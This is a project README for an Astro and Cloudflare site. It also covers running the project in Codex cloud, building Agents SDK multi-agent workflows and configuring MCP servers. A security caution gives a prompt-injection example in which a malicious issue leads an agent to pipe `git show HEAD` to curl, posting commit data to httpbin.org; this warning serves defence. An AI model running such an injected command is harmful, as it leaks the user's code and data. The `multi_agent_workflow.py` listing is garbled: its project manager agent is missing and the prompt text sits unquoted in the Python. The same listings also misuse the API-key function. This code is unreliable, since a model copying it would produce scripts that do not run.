## Key configuration

- **Astro** is configured to output server code for Cloudflare via `@astrojs/cloudflare` (`astro.config.mjs`).
- **Tailwind CSS** integration is enabled with a custom Tailwind config and PostCSS pipeline.
- **Cloudflare Worker** lives in `functions/api/comments.ts`, binding to the `COMMENTS_KV` namespace declared in `wrangler.toml`.
- **TypeScript paths** are configured in `tsconfig.json` for ergonomic imports (`@components/*`, `@layouts/*`, etc.).

## Environment setup

Install dependencies:

```bash
npm install
```

Populate your KV namespace IDs inside `wrangler.toml` and optionally provide additional environment variables under the `[vars]` block.

## Local development

```bash
npm run dev
```

Astro will run locally at `http://localhost:4321` with hot module reloading.

To emulate the Cloudflare Worker locally, run:

```bash
npm run dev -- --experimental-integrations
```

and, in a separate terminal, you can also run `wrangler dev` to exercise just the API function if needed.

## Build & deploy

1. Generate a production build:
   ```bash
   npm run build
   ```
2. Preview the built output locally:
   ```bash
   npm run preview
   ```
3. Publish to Cloudflare Pages (assuming the project is connected):
   ```bash
   wrangler pages deploy ./dist
   ```
   or, for Wrangler deployments to Workers:
   ```bash
   wrangler deploy
   ```

## Run in the cloud (Codex)

Codex cloud tasks can execute this project end-to-end so you can validate deployments without leaving the browser. The
environment mirrors a containerized Linux image (`openai/codex-universal`) with Node.js, npm, Wrangler, and common build tools
preinstalled.

### 1. Customize dependencies and tooling

Codex automatically installs npm dependencies defined in `package.json`. To layer on additional tools (for example, Playwright
or a TypeScript type checker), add setup commands in the **Environment â†’ Setup script** section of your Codex settings:

```bash
# Example setup script
npm install -g wrangler@latest
pnpm install
```

Scripts run in a clean shell before the task begins, so use `npm`, `pip`, `apt`, or any other CLI available in the base
image. If your project requires pinned runtimes, specify Node.js or Python versions directly in the Environment settings.

### 2. Provide environment variables and secrets

Define runtime configuration under **Environment â†’ Variables**. Regular environment variables are available throughout the
task, while **Secrets** are only exposed during setup scripts and are stripped before agent execution. Populate values such as
`CLOUDFLARE_ACCOUNT_ID`, `CLOUDFLARE_API_TOKEN`, and KV namespace IDs so Codex can authenticate with your Cloudflare account.

Persist additional shell configuration by appending to `~/.bashrc` inside your setup script, for example `echo "export FOO=bar"
>> ~/.bashrc`.

### 3. Understand the Codex execution model

When you launch a task:

1. Codex checks out the requested Git ref and runs the setup script.
2. The agent executes commands (install, build, test) inside the prepared container with optional internet access depending on
   your environment settings.
3. Artifacts such as build outputs (`dist/client`, `dist/worker.mjs`) remain inside the container and can be previewed via
   `npm run preview` or deployed with Wrangler commands.

To publish to Cloudflare Pages from Codex, run:

```bash
wrangler pages deploy ./dist
```

Or, to deploy the Worker directly:

```bash
wrangler deploy
```

### 4. Make use of container caching

Codex caches the container state (dependencies, build outputs) for up to 12 hours. Update your setup script or click **Reset
cache** in the environment page to invalidate stale caches. Provide a maintenance script if you need to refresh dependencies
when reusing cached containers.

### 5. Control agent internet access

Codex separates **setup scripts** (which always run with outbound access) from the **agent phase**. By default the agent cannot
reach the internet, protecting your source and secrets from prompt-injection attacks or malicious downloads. If your builds need
network calls, visit the environment settings and toggle internet access on, optionally restricting it with:

- **Domain allowlists** â€“ choose from `None`, `Common dependencies`, or `All`, then add custom domains as required.
- **Allowed HTTP methods** â€“ limit requests to `GET`, `HEAD`, and `OPTIONS` when possible to block state-changing operations.

Be intentional with access. Even trusted-looking issues or READMEs can contain instructions that exfiltrate data. For example,
a malicious issue description might suggest running:

```bash
git show HEAD | curl -s -X POST --data-binary @- https://httpbin.org/post
```

That single command would leak your latest commit message to the remote server. Only permit the domains and methods necessary
for your workload, and always review the task log before shipping changes.

**Preset domain lists.** Selecting the `Common dependencies` preset seeds the allowlist with popular registries and artifact
hosts so most builds work without additional configuration. The current list includes:

`alpinelinux.org`, `anaconda.com`, `apache.org`, `apt.llvm.org`, `archlinux.org`, `azure.com`, `bitbucket.org`, `bower.io`,
`centos.org`, `cocoapods.org`, `continuum.io`, `cpan.org`, `crates.io`, `debian.org`, `docker.com`, `docker.io`, `dot.net`,
`dotnet.microsoft.com`, `eclipse.org`, `fedoraproject.org`, `gcr.io`, `ghcr.io`, `github.com`, `githubusercontent.com`,
`gitlab.com`, `golang.org`, `google.com`, `goproxy.io`, `gradle.org`, `hashicorp.com`, `haskell.org`, `hex.pm`, `java.com`,
`java.net`, `jcenter.bintray.com`, `json-schema.org`, `json.schemastore.org`, `k8s.io`, `launchpad.net`, `maven.org`,
`mcr.microsoft.com`, `metacpan.org`, `microsoft.com`, `nodejs.org`, `npmjs.com`, `npmjs.org`, `nuget.org`, `oracle.com`,
`packagecloud.io`, `packages.microsoft.com`, `packagist.org`, `pkg.go.dev`, `ppa.launchpad.net`, `pub.dev`, `pypa.io`,
`pypi.org`, `pypi.python.org`, `pythonhosted.org`, `quay.io`, `ruby-lang.org`, `rubyforge.org`, `rubygems.org`,
`rubyonrails.org`, `rustup.rs`, `rvm.io`, `sourceforge.net`, `spring.io`, `swift.org`, `ubuntu.com`, `visualstudio.com`,
`yarnpkg.com`.

### 6. Network access and CLI usage

All outbound traffic routes through an HTTP/HTTPS proxy managed by Codex. For workflows that need local automation, the Codex
CLI can reproduce the same container behavior:

```bash
codex tasks run --repo <owner>/<repo> --ref work --command "npm run build"
```

This mirrors the cloud execution path, letting you iterate locally before opening a cloud task.

### 7. Request Codex code reviews directly in GitHub

Once your Codex cloud environment is configured, you can enable repository-level reviews so Codex can leave feedback on pull
requests without opening a separate task. In your Codex settings, toggle **Code review** for this repository. After the
setting is enabled:

1. Mention `@codex review` in any pull request comment to trigger an automated review.
2. Codex will acknowledge the request with an ðŸ‘€ reaction while it analyzes the diff.
3. When finished, Codex posts review comments just like another teammate would.

If you tag `@codex` with any other instruction in a pull request comment, Codex starts a regular cloud task using the PR as
context, making it easy to ask for additional changes or follow-up fixes.

## Use Codex with the Agents SDK

Codex CLI can power deterministic, multi-agent workflows when paired with the OpenAI Agents SDK. By running the CLI as a Model
Context Protocol (MCP) server, you can orchestrate agents that create files, coordinate hand-offs, and leave an auditable trace
of every step. The following guide mirrors the workflow from the OpenAI Cookbook and shows how to scale from a single agent to
an entire delivery pipeline.

### Prerequisites

Before you begin, make sure you have:

- Codex CLI installed locally so `npx codex` is available.
- Python 3.10+ with `pip`.
- Node.js 18+ (required for `npx`).
- An OpenAI API key stored locally (for example in an `.env` file).

Create a working directory and capture your API key:

```bash
mkdir codex-workflows
cd codex-workflows
printf "OPENAI_API_KEY=sk-..." > .env
```

Install the OpenAI Agents SDK packages inside a virtual environment:

```bash
python -m venv .venv
source .venv/bin/activate
pip install --upgrade openai openai-agents python-dotenv
```

### Initialize Codex CLI as an MCP server

Turn Codex CLI into a long-running MCP server that other agents can call. Create a file named `codex_mcp.py` with the
following contents:

```python
import asyncio

from agents import Agent, Runner
from agents.mcp import MCPServerStdio


async def main() -> None:
    async with MCPServerStdio(
        name="Codex CLI",
        params={
            "command": "npx",
            "args": ["-y", "codex", "mcp"],
        },
        client_session_timeout_seconds=360000,
    ) as codex_mcp_server:
        print("Codex MCP server started.")
        # More logic coming in the next sections.
        return


if __name__ == "__main__":
    asyncio.run(main())
```

Verify that the server launches successfully:

```bash
python codex_mcp.py
```

You should see `Codex MCP server started.` printed before the script exits.

### Build a single-agent workflow

Next, add a pair of focused agents that generate a playable browser game. Update `codex_mcp.py` to load your environment
variables, configure the Agents SDK, and orchestrate a designer plus developer hand-off:

```python
import asyncio
import os

from dotenv import load_dotenv

from agents import Agent, Runner, set_default_openai_api
from agents.mcp import MCPServerStdio

load_dotenv(override=True)
set_default_openai_api(os.getenv("OPENAI_API_KEY"))


async def main() -> None:
    async with MCPServerStdio(
        name="Codex CLI",
        params={
            "command": "npx",
            "args": ["-y", "codex", "mcp"],
        },
        client_session_timeout_seconds=360000,
    ) as codex_mcp_server:
        developer_agent = Agent(
            name="Game Developer",
            instructions=(
                "You are an expert in building simple games using basic html + css + javascript with no dependencies. "
                "Save your work in a file called index.html in the current directory. "
                "Always call codex with \"approval-policy\": \"never\" and \"sandbox\": \"workspace-write\"."
            ),
            mcp_servers=[codex_mcp_server],
        )

        designer_agent = Agent(
            name="Game Designer",
            instructions=(
                "You are an indie game connoisseur. Come up with an idea for a single page html + css + javascript game that a "
                "developer could build in about 50 lines of code. "
                "Format your request as a 3 sentence design brief for a game developer and call the Game Developer coder with your idea."
            ),
            model="gpt-5",
            handoffs=[developer_agent],
        )

        await Runner.run(designer_agent, "Implement a fun new game!")


if __name__ == "__main__":
    asyncio.run(main())
```

Run the script again:

```bash
python codex_mcp.py
```

Codex will receive the designer's brief, create an `index.html` file, and produce a fully playable mini game.

### Expand to a multi-agent workflow

For a more advanced pipeline, spin up a project manager plus four specialized agents (designer, frontend developer, backend
developer, and tester). Create `multi_agent_workflow.py` with the following content:

```python
import asyncio
import os

from dotenv import load_dotenv

from agents import (
    Agent,
    ModelSettings,
    Runner,
    WebSearchTool,
    set_default_openai_api,
)
from agents.extensions.handoff_prompt import RECOMMENDED_PROMPT_PREFIX
from agents.mcp import MCPServerStdio
from openai.types.shared import Reasoning

load_dotenv(override=True)
set_default_openai_api(os.getenv("OPENAI_API_KEY"))


async def main() -> None:
    async with MCPServerStdio(
        name="Codex CLI",
        params={"command": "npx", "args": ["-y", "codex", "mcp"]},
        client_session_timeout_seconds=360000,
    ) as codex_mcp_server:

                Convert the input task list into three project-root files the team will execute against.

                Deliverables (write in project root):
                - REQUIREMENTS.md: concise summary of product goals, target users, key features, and constraints.
                - TEST.md: tasks with [Owner] tags (Designer, Frontend, Backend, Tester) and clear acceptance criteria.
                - AGENT_TASKS.md: one section per role containing:
                  - Project name
                  - Required deliverables (exact file names and purpose)
                  - Key technical notes and constraints

                Process:
                - Resolve ambiguities with minimal, reasonable assumptions. Be specific so each role can act without guessing.
                - Create files using Codex MCP with {"approval-policy":"never","sandbox":"workspace-write"}.
                - Do not create folders. Only create REQUIREMENTS.md, TEST.md, AGENT_TASKS.md.

                Handoffs (gated by required files):
                1) After the three files above are created, hand off to the Designer with transfer_to_designer_agent and include REQUIREMENTS.md and AGENT_TASKS.md.
                2) Wait for the Designer to produce /design/design_spec.md. Verify that file exists before proceeding.
                3) When design_spec.md exists, hand off in parallel to both:
                   - Frontend Developer with transfer_to_frontend_developer_agent (provide design_spec.md, REQUIREMENTS.md, AGENT_TASKS.md).
                   - Backend Developer with transfer_to_backend_developer_agent (provide REQUIREMENTS.md, AGENT_TASKS.md).
                4) Wait for Frontend to produce /frontend/index.html and Backend to produce /backend/server.js. Verify both files exist.
                5) When both exist, hand off to the Tester with transfer_to_tester_agent and provide all prior artifacts and outputs.
                6) Do not advance to the next handoff until the required files for that step are present. If something is missing, request the owning agent to supply it and re-check.

                PM Responsibilities:
                - Coordinate all roles, track file completion, and enforce the above gating checks.
                - Do NOT respond with status updates. Just handoff to the next agent until the project is complete.

if __name__ == "__main__":
    asyncio.run(main())
```

Run the workflow and inspect the generated artifacts:

```bash
python multi_agent_workflow.py
ls -R
```

The project manager agent writes `REQUIREMENTS.md`, `TEST.md`, and `AGENT_TASKS.md`, then coordinates hand-offs across the
other roles. Each agent saves scoped deliverables in its own folder before handing control back to the project manager.

### Trace the workflow

Every run automatically records a trace that captures prompts, tool calls, and hand-offs. After the workflow completes, open
the Traces dashboard to review the execution timeline. You can drill down into individual steps to see Codex MCP calls, files
created, and how long each action tookâ€”making it easy to audit the run or debug future adjustments.

### Keep going

Once you are comfortable with the pattern, adapt the project manager instructions for your own repositories. Ideas to explore:

- **Scale real-world rollouts.** Use MCP-powered hand-offs for migrations or refactors where you need repeatable outputs and
  traceability.
- **Accelerate delivery without losing control.** Gate hand-offs on tests, required files, or human approvals while keeping
  agents working in parallel.
- **Integrate with existing tooling.** Hook the Agents SDK into Jira, GitHub, or CI/CD webhooks for closed-loop automation with
  observability baked in.

These building blocks let you deliver Codex-backed workflows that remain deterministic, reviewable, and easy to extend.

## Model Context Protocol (MCP)

Model Context Protocol connects Codex to third-party tools and contextual data sources. Both the Codex CLI and the Codex IDE
extension can talk to MCP servers, letting you bring in documentation, design tools, error trackers, and more without leaving
your workflow.

### Supported MCP features

Codex currently supports:

- **STDIO servers** â€“ launch MCP servers from a local command.
- **Environment variables** â€“ inject credentials or configuration at launch time.
- **Streamable HTTP servers** â€“ connect to remote MCP servers via URL.
- **Bearer token authentication** â€“ attach auth headers for HTTP servers.
- **OAuth authentication** â€“ available when `experimental_use_rmcp_client = true` in `config.toml`.

### Connect Codex to an MCP server

MCP settings live alongside other Codex configuration in `~/.codex/config.toml`. The CLI and IDE extension share this
configuration, so once a server is registered you can use it from either client. In the IDE extension, open the gear icon â†’
**MCP settings** â†’ **Open config.toml** to edit the same file.

You can configure servers through the CLI or by editing the config file directly.

#### Configure via CLI

Use `codex mcp add` to register a new MCP server and optionally supply environment variables:

```bash
codex mcp add <server-name> --env VAR1=VALUE1 --env VAR2=VALUE2 -- <stdio server-command>
```

For example, to install Context7 (a free MCP server for developer documentation):

```bash
codex mcp add context7 -- npx -y @upstash/context7-mcp
```

List additional commands and flags with `codex mcp --help`. Inside the Codex TUI, run `/mcp` to see connected servers.

#### Configure via `config.toml`

For finer control, edit `~/.codex/config.toml` directly. Each STDIO server uses its own `[mcp_servers.<name>]` table with
optional `args` and `env` settings. HTTP-based servers instead declare a `url` plus optional `bearer_token`:

```toml
[mcp_servers.context7]
command = "npx"
args = ["-y", "@upstash/context7-mcp"]

[mcp_servers.context7.env]
MY_ENV_VAR = "MY_ENV_VALUE"

experimental_use_rmcp_client = true

[mcp_servers.figma]
url = "https://mcp.figma.com/mcp"
```

Additional properties:

- `startup_timeout_sec` â€“ time to wait for a server to start.
- `tool_timeout_sec` â€“ execution timeout per tool call.
- `experimental_use_rmcp_client` â€“ enables the RMCP client for STDIO servers and OAuth support for HTTP servers (declare at the
  top level, not under a specific server).

### Examples of useful MCP servers

Popular options include:

- **Context7** â€“ up-to-date developer documentation.
- **Figma Local/Remote** â€“ interact with your design system.
- **Playwright** â€“ drive and inspect a browser instance.
- **Chrome DevTools** â€“ script Chrome for debugging or scraping.
- **Sentry** â€“ surface error logs.
- **GitHub** â€“ manage issues, pull requests, and more beyond raw git.

### Run Codex as an MCP server

Codex itself can expose MCP tools so other clientsâ€”like Agents SDK workflowsâ€”can call into it.

Start a server directly:

```bash
codex mcp-server
```

Or launch it with the MCP Inspector for easier experimentation:

```bash
npx @modelcontextprotocol/inspector codex mcp-server
```

The inspector shows two tools:

- `codex` â€“ start a Codex session. Key properties include `prompt` (required), optional `approval-policy`, `sandbox`,
  `model`, and more. You can also override configuration with `config`, set `cwd`, or toggle the plan tool via
  `include-plan-tool`.
- `codex-reply` â€“ continue an existing session by providing `conversationId` and the next `prompt`.

Codex tasks can take time, so in the inspector increase both the **Request** and **Total** timeouts to `600000` ms (10 minutes)
before running tools.

#### Try it out

Use the inspector and the Codex MCP server to build a quick tic-tac-toe game. Supply the following tool parameters when calling
`codex`:

| Property | Value |
| --- | --- |
| `approval-policy` | `never` |
| `sandbox` | `workspace-write` |
| `prompt` | `Implement a simple tic-tac-toe game with HTML, Javascript, and CSS. Write the game in a single file called index.html.` |

Codex streams back events as it writes `index.html`. Adjust the prompt or configuration to explore other workflows.

## Comments KV quick start

Create a KV namespace and bind it:

```bash
wrangler kv:namespace create "COMMENTS_KV"
wrangler kv:namespace create "COMMENTS_KV" --preview
```

Copy the resulting IDs into the `wrangler.toml` file under the `[[kv_namespaces]]` section. The comment worker stores all comments under keys in the form `comments:<postId>`.

## Deployment notes

- The `VideoCard` and `CommentBox` components are ready to be expanded with real production data.
- Replace placeholder SVG thumbnails in `public/videos/` with optimized imagery for your work.
- Large video files should be delivered from an external CDN (update the URLs in `src/lib/works.ts`).
- The layout ships with SEO-friendly `<meta>` and OpenGraph tags plus a dark/light mode toggle persisted in `localStorage`.

Happy launching!
